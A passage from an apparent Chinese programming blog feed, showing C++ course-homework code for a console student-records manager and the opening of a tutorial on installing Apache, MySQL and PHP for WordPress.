class="built_in">cout</span>&lt;&lt;<span class="string">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios::left);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;Boy[Maxn].Num&lt;&lt;<span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;setw(<span class="number">8</span>)&lt;&lt;Boy[Maxn].Name;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t &quot;</span>&lt;&lt;Boy[Maxn].Sex&lt;&lt;<span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;setiosflags(ios::fixed)&lt;&lt;setprecision(<span class="number">2</span>)&lt;&lt;Boy[Maxn].Score&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    STU S;</span><br><span class="line">    S.TITLE_STU();</span><br><span class="line">    <span class="keyword">int</span> choice;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;choice)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(choice==<span class="number">1</span>)S.ADD_STU();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">2</span>)S.CHANGE_STU();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">3</span>)S.DEL_STU();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">4</span>)S.SHOW_STU();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">5</span>)S.SORT_STU();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">6</span>)S.MAX_STU();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(choice==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">        system(<span class="string">&quot;PAUSE&amp;CLS&quot;</span>);</span><br><span class="line">        S.TITLE_STU();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>文件操作:</strong><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> K = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">STU</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">ll Num;</span><br><span class="line"><span class="keyword">char</span> Name[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">char</span> Sex;</span><br><span class="line"><span class="keyword">double</span> Score;</span><br><span class="line"><span class="keyword">bool</span> flag;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">READ_STU</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WRITE_STU</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TITLE_STU</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ADD_STU</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CHANGE_STU</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DEL_STU</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SHOW_STU</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SORT_STU</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MAX_STU</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="keyword">bool</span> <span class="title">CMP1</span><span class="params">(STU, STU)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="keyword">bool</span> <span class="title">CMP2</span><span class="params">(STU, STU)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">friend</span> <span class="keyword">bool</span> <span class="title">CMP3</span><span class="params">(STU, STU)</span></span>;</span><br><span class="line">STU()</span><br><span class="line">&#123;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">~STU() &#123;&#125;</span><br><span class="line">&#125;Boy[<span class="number">1000</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::READ_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FILE *fp = fopen(<span class="string">&quot;STU.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">fscanf</span>(fp, <span class="string">&quot;%lld %s %c %lf&quot;</span>, &amp;Boy[K].Num, &amp;Boy[K].Name, &amp;Boy[K].Sex, &amp;Boy[K].Score) != EOF)</span><br><span class="line">&#123;</span><br><span class="line">Boy[K].flag = <span class="number">0</span>;</span><br><span class="line">K++;</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::WRITE_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FILE *fp = fopen(<span class="string">&quot;STU.dat&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; K; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(Boy[i].flag==<span class="number">0</span>)</span><br><span class="line"><span class="built_in">fprintf</span>(fp, <span class="string">&quot;%lld %s %c %lf\n&quot;</span>, Boy[i].Num, Boy[i].Name, Boy[i].Sex, Boy[i].Score);</span><br><span class="line">&#125;</span><br><span class="line">fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CMP1</span><span class="params">(STU a, STU b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> a.Num&lt;b.Num;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CMP2</span><span class="params">(STU a, STU b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(a.Name,b.Name)==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> a.Num&lt;b.Num;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strcmp</span>(a.Name,b.Name)&lt;<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CMP3</span><span class="params">(STU a, STU b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (a.Score == b.Score)</span><br><span class="line"><span class="keyword">return</span> a.Num&lt;b.Num;</span><br><span class="line"><span class="keyword">return</span> a.Score&gt;b.Score;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::TITLE_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t1:\tADD A STUDENT&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t2:\tCHANGE STUDENTS\&#x27;S INFORMATION&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t3:\tDELETE A STUDENT&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t4:\tSHOW STUDENTS INFORMATION&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t5:\tSORT THE STUDENTS&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t6:\tSHOW THE MAX SCORE\&#x27; STUDENT&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t0:\tEXIT THE STUDENTS INFORMATION MANAGE SYSTEM&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\tPLEASE ENTER SELECTED CHOICES FROM ABOVE LISTS&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::ADD_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要添加的学生人数&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">int</span> T; <span class="built_in">cin</span> &gt;&gt; T;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入&quot;</span> &lt;&lt; T &lt;&lt; <span class="string">&quot;行学生的学号,姓名,性别,成绩&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;T; i++, K++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; Boy[K].Num &gt;&gt; Boy[K].Name &gt;&gt; Boy[K].Sex &gt;&gt; Boy[K].Score;</span><br><span class="line">Boy[K].flag = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;学生信息导入成功&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::CHANGE_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要修改的学生学号,输入0停止删除&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">ll num;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; num)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;K; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num == Boy[i].Num)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请再次输入学生的学号,姓名,性别,成绩&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; Boy[i].Num &gt;&gt; Boy[i].Name &gt;&gt; Boy[i].Sex &gt;&gt; Boy[i].Score;</span><br><span class="line">Boy[i].flag = <span class="number">0</span>;</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;学生信息修改成功&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (num == <span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (flag == <span class="number">0</span>)<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NO SUCH STUDENTS&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::DEL_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要删除的学生学号,输入0停止删除&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">ll num;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; num)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;K; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (num == Boy[i].Num)</span><br><span class="line">&#123;</span><br><span class="line">Boy[i].flag = <span class="number">1</span>;</span><br><span class="line">flag = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;DELETE SUCCESS!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (num == <span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (flag == <span class="number">0</span>)<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NO SUCH STUDENTS&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::SHOW_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="string">&quot;\tThe Lists Of Students Are Here&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;    学号\t姓名\t\t性别\t成绩&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios::left);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;K; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Boy[i].flag == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; Boy[i].Num &lt;&lt; <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; setw(<span class="number">8</span>) &lt;&lt; Boy[i].Name;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t &quot;</span> &lt;&lt; Boy[i].Sex &lt;&lt; <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setprecision(<span class="number">2</span>) &lt;&lt; Boy[i].Score &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::SORT_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> x=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;1.按学号排序&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;2.按姓名排序&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;3.按成绩排序&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请选择排序规则!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line"><span class="keyword">if</span>(x==<span class="number">1</span>)sort(Boy, Boy + K, CMP1);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(x==<span class="number">2</span>)sort(Boy, Boy + K, CMP2);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (x == <span class="number">3</span>)sort(Boy, Boy + K, CMP3);</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;输入错误，排序失败&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;;</span><br><span class="line"><span class="keyword">if</span> (x == <span class="number">1</span> || x == <span class="number">2</span> || x == <span class="number">3</span>)<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;学生信息排序成功&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::MAX_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> Maxn = <span class="number">0</span>, Flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;K; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (Boy[i].Score &gt;= Boy[Maxn].Score)</span><br><span class="line">&#123;</span><br><span class="line">Maxn = i;</span><br><span class="line">Flag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (Flag == <span class="number">0</span>)<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;NO STUDENT&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;    学号\t姓名\t\t性别\t成绩&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios::left);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; Boy[Maxn].Num &lt;&lt; <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; setw(<span class="number">8</span>) &lt;&lt; Boy[Maxn].Name;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\t &quot;</span> &lt;&lt; Boy[Maxn].Sex &lt;&lt; <span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; setiosflags(ios::fixed) &lt;&lt; setprecision(<span class="number">2</span>) &lt;&lt; Boy[Maxn].Score &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-----------------------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">STU S;</span><br><span class="line">S.TITLE_STU();</span><br><span class="line">S.READ_STU();</span><br><span class="line"><span class="keyword">int</span> choice;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; choice)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (choice == <span class="number">1</span>)S.ADD_STU();</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>)S.CHANGE_STU();</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">3</span>)S.DEL_STU();</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">4</span>)S.SHOW_STU();</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">5</span>)S.SORT_STU();</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">6</span>)S.MAX_STU();</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">S.WRITE_STU();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;PAUSE&amp;CLS&quot;</span>);</span><br><span class="line">S.TITLE_STU();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;C++课程作业&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="编程语言" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="C++" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"/>
    
    
  </entry>
  
  <entry>
    <title>搭建WordPress服务器</title>
    <link href="https://blog.todest.cn/post/34b16289/"/>
    <id>https://blog.todest.cn/post/34b16289/</id>
    <published>2020-04-08T08:08:24.000Z</published>
    <updated>2020-05-11T09:42:34.785Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;WordPress是一个开源的博客平台，可以很方便的进行博客写作，搭建WordPress首先需要你有一个属于自己的服务器，服务器空间则更加方便（因为不需要自己安装各种前置软件），当然还是推荐买一个阿里云或腾讯云的学生机服务器。<br><a id="more"></a><br><strong>安装 Apache</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update <span class="comment"># 首先还是先更新下软件包源</span></span><br><span class="line">sudo apt install apache2</span><br><span class="line">sudo apt install <span class="comment"># 当然再顺便安装下强大的vim编辑器</span></span><br></pre></td></tr></table></figure><br><strong>安装 MySQL</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install mysql-server mysql-client</span><br></pre></td></tr></table></figure><br><strong>安装 PHP</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install php7.0 </span><br><span class="line">sudo apt install php7.0-mysql</span><br></pre></td></tr></table></figure><br><strong>重启服务</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo service apache2 restart </span><br><span class="line">sudo service mysql restart</span><br></pre></td></tr></table></figure><br><strong>安装 